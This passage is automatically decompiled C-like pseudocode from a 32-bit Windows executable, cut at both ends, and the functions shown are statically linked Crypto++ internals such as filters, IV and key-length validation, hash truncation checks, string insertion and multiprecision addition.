  else
  {
    v4 = sub_40DBEE();
    return sub_40B21E(this, (int)v4, 0i64, -1i64, (int)dword_48C040);
  }
}
// 48C040: using guessed type _DWORD dword_48C040[6];

//----- (0040D6E8) --------------------------------------------------------
int __thiscall sub_40D6E8(void *this, int a2, int a3)
{
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 36))(this, a3);
}

//----- (0040D6F4) --------------------------------------------------------
int *sub_40D6F4()
{
  if ( dword_490C38 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_490C38);
    if ( dword_490C38 == -1 )
    {
      sub_40CAC3(&dword_490C34, 1);
      dword_490C34 = (int)&CryptoPP::ClassNullRNG::`vftable';
      atexit(nullsub_3);
      _Init_thread_footer(&dword_490C38);
    }
  }
  return &dword_490C34;
}
// 42D09E: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 42D0E8: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 46C7B0: using guessed type void *CryptoPP::ClassNullRNG::`vftable';
// 490C34: using guessed type int dword_490C34;
// 490C38: using guessed type int dword_490C38;
// 492450: using guessed type int TlsIndex;

//----- (0040D767) --------------------------------------------------------
int __thiscall sub_40D767(void *this)
{
  int v2; // eax
  void ***v4; // eax

  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 160))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 160))(this);
    return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 92))(v2);
  }
  else
  {
    v4 = sub_40DBEE();
    return sub_40D1B6(this, (int)v4, -1, (int)dword_48C040);
  }
}
// 48C040: using guessed type _DWORD dword_48C040[6];

//----- (0040D79E) --------------------------------------------------------
int __thiscall sub_40D79E(int *this, int a2)
{
  bool v3; // zf
  int v4; // eax
  int v5; // eax

  v3 = (*(int (__thiscall **)(int *))(*this + 160))(this) == 0;
  v4 = *this;
  if ( v3 )
    return (*(int (__thiscall **)(int *, int, int))(v4 + 76))(this, a2, 1);
  v5 = (*(int (__thiscall **)(int *))(v4 + 160))(this);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)v5 + 80))(v5, a2);
}

//----- (0040D7CC) --------------------------------------------------------
int __thiscall sub_40D7CC(void *this, int a2, int a3)
{
  int v4; // eax
  int v6[6]; // [esp+10h] [ebp-30h] BYREF
  __int64 v7; // [esp+28h] [ebp-18h]
  int v8; // [esp+3Ch] [ebp-4h]

  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 160))(this) )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 160))(this);
    return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v4 + 76))(v4, a2, a3);
  }
  else
  {
    v6[0] = (int)&CryptoPP::ArraySink::`vftable';
    v6[1] = (int)&CryptoPP::ArraySink::`vftable';
    v6[3] = a2;
    v6[4] = a3;
    v7 = 0i64;
    v8 = 2;
    return sub_40B21E(this, (int)v6, 0i64, (unsigned int)a3, (int)dword_48C040);
  }
}
// 46C22C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 46C2E0: using guessed type void *CryptoPP::ArraySink::`vftable';
// 48C040: using guessed type _DWORD dword_48C040[6];

//----- (0040D842) --------------------------------------------------------
int __thiscall sub_40D842(int *this, _WORD *a2, int a3)
{
  int v3; // eax
  int v4; // esi
  unsigned __int16 v6; // [esp+4h] [ebp-4h] BYREF

  v3 = *this;
  v6 = 0;
  v4 = (*(int (__thiscall **)(int *, unsigned __int16 *, int))(v3 + 76))(this, &v6, 2);
  if ( a3 )
    *a2 = _byteswap_ushort(v6);
  else
    *a2 = (unsigned __int8)v6 | (HIBYTE(v6) << 8);
  return v4;
}

//----- (0040D891) --------------------------------------------------------
int __thiscall sub_40D891(void *this, int a2, int a3, int a4, int a5)
{
  int v6; // esi
  _BYTE **v7; // eax
  _DWORD *v8; // eax
  char v10[24]; // [esp+14h] [ebp-68h] BYREF
  char v11[24]; // [esp+2Ch] [ebp-50h] BYREF
  int pExceptionObject[13]; // [esp+44h] [ebp-38h] BYREF
  int v13; // [esp+78h] [ebp-4h]

  v6 = a5;
  if ( a5 == (*(int (__thiscall **)(void *))(*(_DWORD *)this + 12))(this) )
  {
    (*(void (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 28))(this, a2, a4, a5);
  }
  else
  {
    if ( a5 )
    {
      v7 = (_BYTE **)(*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 8))(this, v11);
      v13 = 0;
      v8 = (_DWORD *)sub_40BEFB((int)v10, v7, ": this object doesn't support a special last block");
      LOBYTE(v13) = 1;
      sub_406307(pExceptionObject, 0, v8);
      pExceptionObject[0] = (int)&CryptoPP::NotImplemented::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
    }
    return a3;
  }
  return v6;
}
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 40D891: using guessed type char var_50[24];
// 40D891: using guessed type char var_68[24];

//----- (0040D918) --------------------------------------------------------
int __stdcall sub_40D918(int a1, int a2, int a3, int a4)
{
  return 0;
}

//----- (0040D91D) --------------------------------------------------------
int __thiscall sub_40D91D(int this, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  int v7; // esi
  __int64 v9; // rax
  size_t v10; // edi
  size_t v11; // esi
  size_t Size; // [esp+10h] [ebp-54h] BYREF
  int pExceptionObject[10]; // [esp+14h] [ebp-50h] BYREF
  _DWORD Src[2]; // [esp+3Ch] [ebp-28h] BYREF
  _DWORD v15[3]; // [esp+44h] [ebp-20h] BYREF
  int v16; // [esp+50h] [ebp-14h]
  int v17; // [esp+60h] [ebp-4h]

  v6 = *(_DWORD *)(this + 20);
  v7 = 1;
  if ( v6 )
  {
    if ( v6 != 1 )
      return 0;
  }
  else
  {
    *(_DWORD *)(this + 16) = 0;
    (*(void (__thiscall **)(int, int, int, _DWORD, int))(*(_DWORD *)(this + 36) + 20))(this + 36, a2, a3, 0, 1);
    if ( !a4 )
      return 0;
    v9 = sub_424EC6((_DWORD *)(this + 36));
    if ( !sub_40AA98(v9, SHIDWORD(v9), &Size) )
    {
      sub_40AAE3((int)Src, "PK_DefaultEncryptionFilter: plaintext too long");
      v17 = 0;
      sub_406307(pExceptionObject, 1, Src);
      pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v10 = Size;
    v11 = (*(int (__thiscall **)(_DWORD, size_t))(**(_DWORD **)(this + 28) + 8))(*(_DWORD *)(this + 28), Size);
    sub_408A33(v15, v10);
    v17 = 1;
    (*(void (__thiscall **)(int, int, size_t))(*(_DWORD *)(this + 36) + 68))(this + 36, v16, v10);
    sub_40BCE8(this + 76, v11);
    (*(void (__thiscall **)(_DWORD, _DWORD, int, size_t, _DWORD, _DWORD))(**(_DWORD **)(this + 28) + 24))(
      *(_DWORD *)(this + 28),
      *(_DWORD *)(this + 24),
      v16,
      v10,
      *(_DWORD *)(this + 88),
      *(_DWORD *)(this + 32));
    v17 = -1;
    sub_4089EF(v15);
    v7 = 1;
  }
  if ( !sub_41E5B7((_DWORD *)this, 1, *(_DWORD *)(this + 88), *(_DWORD *)(this + 84), a4, a5, (int)dword_48C040) )
    return 0;
  if ( (unsigned int)(*(_DWORD *)(this + 84) - *(_DWORD *)(this + 16)) > 1 )
    return *(_DWORD *)(this + 84) - *(_DWORD *)(this + 16);
  return v7;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 48C040: using guessed type _DWORD dword_48C040[6];
// 40D91D: using guessed type _DWORD Src[2];
// 40D91D: using guessed type _DWORD var_20[3];

//----- (0040DA3B) --------------------------------------------------------
int __thiscall sub_40DA3B(_DWORD *this, unsigned int a2, int a3, int a4)
{
  return sub_40D18C(this, (int)dword_48C040, a2, a3, a4);
}
// 48C040: using guessed type _DWORD dword_48C040[6];

//----- (0040DA54) --------------------------------------------------------
int __thiscall sub_40DA54(void *this, int a2, int a3, int a4)
{
  sub_40DE8C(this, a3);
  return (*(int (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 56))(this, a2, a3, a4);
}

//----- (0040DA77) --------------------------------------------------------
void __thiscall sub_40DA77(int *this, int a2, int a3, void *Src, int Size)
{
  _DWORD *v6; // eax
  char *v7; // eax
  int v8; // edx
  int v9[3]; // [esp+10h] [ebp-34h] BYREF
  int v10[4]; // [esp+1Ch] [ebp-28h] BYREF
  void **v11; // [esp+2Ch] [ebp-18h] BYREF
  int v12[4]; // [esp+30h] [ebp-14h] BYREF
  int v13; // [esp+40h] [ebp-4h]

  v6 = sub_406A82(v9, Src, Size, 0);
  v13 = 0;
  v7 = sub_4096C6((char *)&v11, (int)&unk_46C65C, (int)v6, 1);
  v8 = *this;
  LOBYTE(v13) = 1;
  (*(void (__thiscall **)(int *, int, int, char *))(v8 + 24))(this, a2, a3, v7);
  sub_40967A(v12);
  v11 = &CryptoPP::NameValuePairs::`vftable';
  sub_4089EF(v10);
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 40DA77: using guessed type int var_34[3];
// 40DA77: using guessed type int var_14[4];
// 40DA77: using guessed type int var_28[4];

//----- (0040DADE) --------------------------------------------------------
int __thiscall sub_40DADE(void *this, int a2)
{
  int result; // eax
  int v4; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
  if ( result )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v4 + 152))(v4, a2);
  }
  return result;
}

//----- (0040DB06) --------------------------------------------------------
int __thiscall sub_40DB06(void *this, int a2, int a3)
{
  int v4; // eax
  void ***v6; // eax
  int v7[2]; // [esp+4h] [ebp-8h] BYREF

  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this) )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
    return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v4 + 84))(v4, a2, a3);
  }
  else
  {
    v7[0] = a2;
    v7[1] = a3;
    v6 = sub_40DBEE();
    (*(void (__thiscall **)(void *, void ***, int *, _DWORD *, int))(*(_DWORD *)this + 124))(
      this,
      v6,
      v7,
      dword_48C040,
      1);
    return v7[0];
  }
}
// 48C040: using guessed type _DWORD dword_48C040[6];

//----- (0040DB64) --------------------------------------------------------
int __thiscall sub_40DB64(void *this)
{
  int v2; // eax
  int result; // eax
  __int64 v4; // rax

  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
    return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 108))(v2);
  }
  else
  {
    while ( (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 104))(this, -1) )
      ;
    do
    {
      v4 = ((__int64 (__thiscall *)(void *, int, int))*(_DWORD *)(*(_DWORD *)this + 84))(this, -1, -1);
      result = HIDWORD(v4) | v4;
    }
    while ( result );
  }
  return result;
}

//----- (0040DBA3) --------------------------------------------------------
int __thiscall sub_40DBA3(int *this, int a2)
{
  int v3; // eax
  void ***v5; // eax

  if ( (*(int (__thiscall **)(int *))(*this + 164))(this) )
  {
    v3 = (*(int (__thiscall **)(int *))(*this + 164))(this);
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v3 + 104))(v3, a2);
  }
  else
  {
    v5 = sub_40DBEE();
    sub_40E0AB(this, v5, (unsigned int *)&a2, (int)dword_48C040, 1);
    return a2;
  }
}
// 48C040: using guessed type _DWORD dword_48C040[6];

//----- (0040DBEE) --------------------------------------------------------
void ***sub_40DBEE()
{
  if ( dword_490C30 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_490C30);
    if ( dword_490C30 == -1 )
    {
      atexit(nullsub_2);
      _Init_thread_footer(&dword_490C30);
    }
  }
  return &off_48C058;
}
// 42D09E: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 42D0E8: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 48C058: using guessed type void **off_48C058;
// 490C30: using guessed type int dword_490C30;
// 492450: using guessed type int TlsIndex;

//----- (0040DC48) --------------------------------------------------------
void __thiscall sub_40DC48(void *this, int a2)
{
  int v3; // eax
  _BYTE **v4; // eax
  _DWORD *v5; // eax
  char v6[24]; // [esp+10h] [ebp-68h] BYREF
  char v7[24]; // [esp+28h] [ebp-50h] BYREF
  int pExceptionObject[13]; // [esp+40h] [ebp-38h] BYREF
  int v9; // [esp+74h] [ebp-4h]

  if ( !a2 && (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this) == 2 )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
    v4 = (_BYTE **)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 8))(v3, v7);
    v9 = 0;
    v5 = (_DWORD *)sub_40BEFB((int)v6, v4, ": this object cannot use a null IV");
    LOBYTE(v9) = 1;
    sub_406307(pExceptionObject, 1, v5);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 40DC48: using guessed type char var_50[24];
// 40DC48: using guessed type char var_68[24];

//----- (0040DCBA) --------------------------------------------------------
int __thiscall sub_40DCBA(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  bool v6; // cf
  int v7; // eax
  int *v8; // edi
  int v9; // eax
  _DWORD *v10; // ebx
  _DWORD *v11; // esi
  int v12; // edx
  _BYTE **v13; // eax
  char *v14; // eax
  _BYTE **v15; // eax
  char *v16; // eax
  _DWORD *v17; // eax
  int *v18; // edi
  int v19; // eax
  _DWORD *v20; // ebx
  _DWORD *v21; // esi
  int v22; // edx
  _BYTE **v23; // eax
  char *v24; // eax
  _BYTE **v25; // eax
  char *v26; // eax
  _DWORD *v27; // eax
  int v28[6]; // [esp+14h] [ebp-1B0h] BYREF
  char v29[24]; // [esp+2Ch] [ebp-198h] BYREF
  int v30[6]; // [esp+44h] [ebp-180h] BYREF
  char v31[24]; // [esp+5Ch] [ebp-168h] BYREF
  char v32[24]; // [esp+74h] [ebp-150h] BYREF
  int v33[6]; // [esp+8Ch] [ebp-138h] BYREF
  int v34[6]; // [esp+A4h] [ebp-120h] BYREF
  int v35[6]; // [esp+BCh] [ebp-108h] BYREF
  char v36[24]; // [esp+D4h] [ebp-F0h] BYREF
  int v37[6]; // [esp+ECh] [ebp-D8h] BYREF
  char v38[24]; // [esp+104h] [ebp-C0h] BYREF
  char v39[24]; // [esp+11Ch] [ebp-A8h] BYREF
  int v40[6]; // [esp+134h] [ebp-90h] BYREF
  int v41[6]; // [esp+14Ch] [ebp-78h] BYREF
  int v42[10]; // [esp+164h] [ebp-60h] BYREF
  int pExceptionObject[13]; // [esp+18Ch] [ebp-38h] BYREF
  int v44; // [esp+1C0h] [ebp-4h]

  v3 = a2;
  v4 = *this;
  if ( a2 < 0 )
    return (*(int (**)(void))(v4 + 32))();
  v6 = a2 < (unsigned int)(*(int (**)(void))(v4 + 36))();
  v7 = *this;
  if ( v6 )
  {
    v8 = (int *)(*(int (__thiscall **)(int *))(v7 + 52))(this);
    v9 = (*(int (__thiscall **)(int *))(*this + 36))(this);
    v10 = sub_40BF8D(v41, v9, 0xAu);
    v44 = 0;
    v11 = sub_40C983(v40, a2, 0xAu);
    v12 = *v8;
    LOBYTE(v44) = 1;
    v13 = (_BYTE **)(*(int (__thiscall **)(int *, char *))(v12 + 8))(v8, v39);
    LOBYTE(v44) = 2;
    v14 = (char *)sub_40BEFB((int)v38, v13, ": IV length ");
    LOBYTE(v44) = 3;
    v15 = (_BYTE **)sub_409630((int)v37, v14, v11);
    LOBYTE(v44) = 4;
    v16 = (char *)sub_40BEFB((int)v36, v15, " is less than the minimum of ");
    LOBYTE(v44) = 5;
    v17 = (_DWORD *)sub_409630((int)v35, v16, v10);
    LOBYTE(v44) = 6;
    sub_406307(pExceptionObject, 1, v17);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( a2 > (unsigned int)(*(int (__thiscall **)(int *))(v7 + 40))(this) )
  {
    v18 = (int *)(*(int (__thiscall **)(int *))(*this + 52))(this);
    v19 = (*(int (__thiscall **)(int *))(*this + 40))(this);
    v20 = sub_40BF8D(v34, v19, 0xAu);
    v44 = 7;
    v21 = sub_40C983(v33, a2, 0xAu);
    v22 = *v18;
    LOBYTE(v44) = 8;
    v23 = (_BYTE **)(*(int (__thiscall **)(int *, char *))(v22 + 8))(v18, v32);
    LOBYTE(v44) = 9;
    v24 = (char *)sub_40BEFB((int)v31, v23, ": IV length ");
    LOBYTE(v44) = 10;
    v25 = (_BYTE **)sub_409630((int)v30, v24, v21);
    LOBYTE(v44) = 11;
    v26 = (char *)sub_40BEFB((int)v29, v25, " exceeds the maximum of ");
    LOBYTE(v44) = 12;
    v27 = (_DWORD *)sub_409630((int)v28, v26, v20);
    LOBYTE(v44) = 13;
    sub_406307(v42, 1, v27);
    v42[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(v42, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return v3;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 40DCBA: using guessed type int var_78[6];
// 40DCBA: using guessed type int var_90[6];
// 40DCBA: using guessed type char var_A8[24];
// 40DCBA: using guessed type char var_C0[24];
// 40DCBA: using guessed type int var_D8[6];
// 40DCBA: using guessed type char var_F0[24];
// 40DCBA: using guessed type int var_108[6];
// 40DCBA: using guessed type int var_120[6];
// 40DCBA: using guessed type int var_138[6];
// 40DCBA: using guessed type char var_150[24];
// 40DCBA: using guessed type char var_168[24];
// 40DCBA: using guessed type int var_180[6];
// 40DCBA: using guessed type char var_198[24];
// 40DCBA: using guessed type int var_1B0[6];

//----- (0040DE8C) --------------------------------------------------------
int __thiscall sub_40DE8C(void *this, int a2)
{
  int result; // eax
  int v4; // eax
  _DWORD *v5; // eax
  char v6[24]; // [esp+10h] [ebp-50h] BYREF
  _DWORD pExceptionObject[14]; // [esp+28h] [ebp-38h] BYREF

  result = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 20))(this, a2);
  if ( !(_BYTE)result )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
    v5 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v4 + 8))(v4, v6);
    pExceptionObject[13] = 0;
    sub_40CBC3(pExceptionObject, v5, a2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVInvalidKeyLength_CryptoPP__);
  }
  return result;
}
// 40DE8C: using guessed type char var_50[24];

//----- (0040DEDE) --------------------------------------------------------
unsigned int __thiscall sub_40DEDE(int *this, unsigned int a2)
{
  unsigned int result; // eax
  _DWORD *v4; // esi
  int v5; // edx
  int v6; // eax
  _DWORD *v7; // eax
  _BYTE **v8; // eax
  char *v9; // eax
  _BYTE **v10; // eax
  _DWORD *v11; // eax
  char v12[24]; // [esp+10h] [ebp-C8h] BYREF
  int v13[6]; // [esp+28h] [ebp-B0h] BYREF
  char v14[24]; // [esp+40h] [ebp-98h] BYREF
  char v15[24]; // [esp+58h] [ebp-80h] BYREF
  int v16[6]; // [esp+70h] [ebp-68h] BYREF
  int v17[6]; // [esp+88h] [ebp-50h] BYREF
  int pExceptionObject[13]; // [esp+A0h] [ebp-38h] BYREF
  int v19; // [esp+D4h] [ebp-4h]

  result = (*(int (__thiscall **)(int *))(*this + 28))(this);
  if ( a2 > result )
  {
    v4 = sub_40BF8D(v17, a2, 0xAu);
    v5 = *this;
    v19 = 0;
    v6 = (*(int (__thiscall **)(int *))(v5 + 28))(this);
    v7 = sub_40BF8D(v16, v6, 0xAu);
    LOBYTE(v19) = 1;
    v8 = (_BYTE **)sub_40C8C7((int)v15, "HashTransformation: can't truncate a ", (_BYTE **)v7);
    LOBYTE(v19) = 2;
    v9 = (char *)sub_40BEFB((int)v14, v8, " byte digest to ");
    LOBYTE(v19) = 3;
    v10 = (_BYTE **)sub_409630((int)v13, v9, v4);
    LOBYTE(v19) = 4;
    v11 = (_DWORD *)sub_40BEFB((int)v12, v10, " bytes");
    LOBYTE(v19) = 5;
    sub_406307(pExceptionObject, 1, v11);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 40DEDE: using guessed type int var_50[6];
// 40DEDE: using guessed type int var_68[6];
// 40DEDE: using guessed type char var_80[24];
// 40DEDE: using guessed type char var_98[24];
// 40DEDE: using guessed type int var_B0[6];
// 40DEDE: using guessed type char var_C8[24];

//----- (0040DFA7) --------------------------------------------------------
int __thiscall sub_40DFA7(void *this)
{
  int result; // eax
  int v3; // eax
  _BYTE **v4; // eax
  _DWORD *v5; // eax
  char v6[24]; // [esp+10h] [ebp-68h] BYREF
  char v7[24]; // [esp+28h] [ebp-50h] BYREF
  int pExceptionObject[13]; // [esp+40h] [ebp-38h] BYREF
  int v9; // [esp+74h] [ebp-4h]

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
  if ( result < 4 )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
    v4 = (_BYTE **)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 8))(v3, v7);
    v9 = 0;
    v5 = (_DWORD *)sub_40BEFB((int)v6, v4, ": this object requires an IV");
    LOBYTE(v9) = 1;
    sub_406307(pExceptionObject, 1, v5);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 40DFA7: using guessed type char var_50[24];
// 40DFA7: using guessed type char var_68[24];

//----- (0040E011) --------------------------------------------------------
int __thiscall sub_40E011(int *this)
{
  bool v2; // zf
  int v3; // eax
  int v4; // eax

  v2 = (*(int (__thiscall **)(int *))(*this + 160))(this) == 0;
  v3 = *this;
  if ( v2 )
    return (*(int (__thiscall **)(int *))(v3 + 60))(this);
  v4 = (*(int (__thiscall **)(int *))(v3 + 160))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 88))(v4);
}

//----- (0040E036) --------------------------------------------------------
int __thiscall sub_40E036(int *this, void *a2, int a3, int a4)
{
  int result; // eax
  int v6; // eax
  __int64 v7; // [esp+4h] [ebp-Ch] BYREF
  unsigned int v8; // [esp+Ch] [ebp-4h] BYREF

  while ( (*(int (**)(void))(*this + 164))() )
    this = (int *)(*(int (__thiscall **)(int *))(*this + 164))(this);
  while ( 1 )
  {
    v8 = -1;
    result = sub_40E0AB(this, a2, &v8, a3, a4);
    if ( result )
      break;
    if ( !v8 )
    {
      do
      {
        v6 = *this;
        v7 = 0xFFFFFFFFi64;
        result = (*(int (__thiscall **)(int *, void *, __int64 *, int, int))(v6 + 124))(this, a2, &v7, a3, a4);
        if ( result )
          break;
        result = HIDWORD(v7) | v7;
      }
      while ( v7 );
      return result;
    }
  }
  return result;
}

//----- (0040E0AB) --------------------------------------------------------
int __thiscall sub_40E0AB(int *this, void *a2, unsigned int *a3, int a4, int a5)
{
  unsigned int v6; // ebx
  int result; // eax
  bool v8; // zf
  int v9; // eax
  int v10; // eax
  int v11[2]; // [esp+Ch] [ebp-8h] BYREF

  while ( (*(int (**)(void))(*this + 164))() )
    this = (int *)(*(int (__thiscall **)(int *))(*this + 164))(this);
  v6 = *a3;
  *a3 = 0;
  if ( v6 )
  {
    while ( (*(unsigned __int8 (__thiscall **)(int *))(*this + 96))(this) )
    {
      while ( 1 )
      {
        v8 = (*(unsigned __int8 (__thiscall **)(int *))(*this + 64))(this) == 0;
        v9 = *this;
        if ( v8 )
          break;
        v11[0] = -1;
        v11[1] = -1;
        result = (*(int (__thiscall **)(int *, void *, int *, int, int))(v9 + 124))(this, a2, v11, a4, a5);
        if ( result )
          return result;
      }
      v10 = (*(int (__thiscall **)(int *))(v9 + 56))(this);
      if ( sub_40D094(a2, a4, v10, a5) )
        return 1;
      (*(void (__thiscall **)(int *))(*this + 100))(this);
      if ( ++*a3 >= v6 )
        return 0;
    }
  }
  return 0;
}

//----- (0040E146) --------------------------------------------------------
bool __thiscall sub_40E146(int *this, int a2, size_t Size)
{
  int v4; // eax
  bool v5; // bl
  _DWORD v7[3]; // [esp+10h] [ebp-1Ch] BYREF
  unsigned int v8; // [esp+1Ch] [ebp-10h]
  int v9; // [esp+28h] [ebp-4h]

  sub_40DEDE(this, Size);
  sub_408A33(v7, Size);
  v4 = *this;
  v9 = 0;
  (*(void (__thiscall **)(int *, unsigned int, size_t))(v4 + 56))(this, v8, Size);
  v5 = sub_420C0B(v8, a2, Size);
  sub_4089EF(v7);
  return v5;
}
// 40E146: using guessed type _DWORD var_1C[3];

//----- (0040E19D) --------------------------------------------------------
_BYTE *__thiscall sub_40E19D(_BYTE *this, unsigned int a2, int a3)
{
  if ( a2 > 0x100 || this[257] )
    return 0;
  this[257] = 1;
  return this;
}

//----- (0040E1C0) --------------------------------------------------------
char __thiscall sub_40E1C0(_BYTE *this, _BYTE *a2, unsigned int a3)
{
  char result; // al

  if ( a2 == this )
  {
    this[257] = 0;
    result = 0;
    memset(a2, 0, a3);
  }
  return result;
}

//----- (0040E1DC) --------------------------------------------------------
const void **__fastcall sub_40E1DC(_BYTE **a1, int a2, int a3, _BYTE *Src, size_t Size)
{
  _BYTE *v6; // eax
  unsigned int v8; // ecx
  size_t v10; // ebp
  char *v11; // edx
  int v12; // ecx
  size_t v13; // eax
  char *v14; // eax
  bool v15; // cf
  _BYTE *v16; // eax
  char *Sizea; // [esp+14h] [ebp+Ch]

  if ( sub_40BA21(a1, a2, (unsigned int)Src) )
  {
    if ( (unsigned int)a1[5] < 0x10 )
      v6 = a1;
    else
      v6 = *a1;
    return sub_40C72A((const void **)a1, a3, (const void **)a1, Src - v6, Size);
  }
  else
  {
    sub_40B83F(a1, a3);
    v8 = (unsigned int)a1[4];
    if ( ~v8 <= Size )
      sub_429710("string too long");
    v10 = v8 + Size;
    if ( Size && sub_40B998((const void **)a1, v8 + Size, 0) )
    {
      if ( (unsigned int)a1[5] < 0x10 )
        Sizea = (char *)a1;
      else
        Sizea = *a1;
      if ( (unsigned int)a1[5] < 0x10 )
        v11 = (char *)a1;
      else
        v11 = *a1;
      v12 = a3;
      v13 = (size_t)&a1[4][-a3];
      if ( v13 )
      {
        memmove(&v11[a3 + Size], &Sizea[a3], v13);
        v12 = a3;
      }
      if ( (unsigned int)a1[5] < 0x10 )
        v14 = (char *)a1;
      else
        v14 = *a1;
      if ( Size )
        memmove_0(&v14[v12], Src, Size);
      v15 = (unsigned int)a1[5] < 0x10;
      a1[4] = (_BYTE *)v10;
      if ( v15 )
        v16 = a1;
      else
        v16 = *a1;
      v16[v10] = 0;
    }
    return (const void **)a1;
  }
}

//----- (0040E2D2) --------------------------------------------------------
BOOL __fastcall sub_40E2D2(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // edi
  int v6; // edx
  unsigned int v7; // ecx
  bool v8; // cf
  char v9; // cf
  int v10; // esi
  int v11; // esi
  BOOL v12; // ett
  int v13; // esi
  int v14; // esi
  BOOL v15; // ett
  int v16; // esi
  int v17; // esi
  int v18; // ett
  int v19; // esi
  int v20; // esi
  BOOL v21; // ett

  v4 = a3 + 4 * a1;
  v5 = a4 + 4 * a1;
  v6 = a2 + 4 * a1;
  v7 = -a1;
  v8 = 0;
  if ( (v7 & 2) == 0 )
    goto LABEL_3;
  v9 = v7 < 2;
  for ( v7 -= 2; ; *(_DWORD *)(v6 + 4 * v7 + 4) = *(_DWORD *)(v5 + 4 * v7 + 4) + v14 )
  {
    v16 = *(_DWORD *)(v4 + 4 * v7 + 8);
    v18 = v9;
    v8 = __CFADD__(v9, v16);
    v17 = v18 + v16;
    v8 |= __CFADD__(*(_DWORD *)(v5 + 4 * v7 + 8), v17);
    *(_DWORD *)(v6 + 4 * v7 + 8) = *(_DWORD *)(v5 + 4 * v7 + 8) + v17;
    v19 = *(_DWORD *)(v4 + 4 * v7 + 12);
    v21 = v8;
    v8 = __CFADD__(v8, v19);
    v20 = v21 + v19;
    v8 |= __CFADD__(*(_DWORD *)(v5 + 4 * v7 + 12), v20);
    *(_DWORD *)(v6 + 4 * v7 + 12) = *(_DWORD *)(v5 + 4 * v7 + 12) + v20;
    v7 += 4;
LABEL_3:
    if ( !v7 )
      break;
    v10 = *(_DWORD *)(v4 + 4 * v7);
    v12 = v8;
    v8 = __CFADD__(v8, v10);
    v11 = v12 + v10;
    v8 |= __CFADD__(*(_DWORD *)(v5 + 4 * v7), v11);
    *(_DWORD *)(v6 + 4 * v7) = *(_DWORD *)(v5 + 4 * v7) + v11;
    v13 = *(_DWORD *)(v4 + 4 * v7 + 4);
    v15 = v8;
    v8 = __CFADD__(v8, v13);
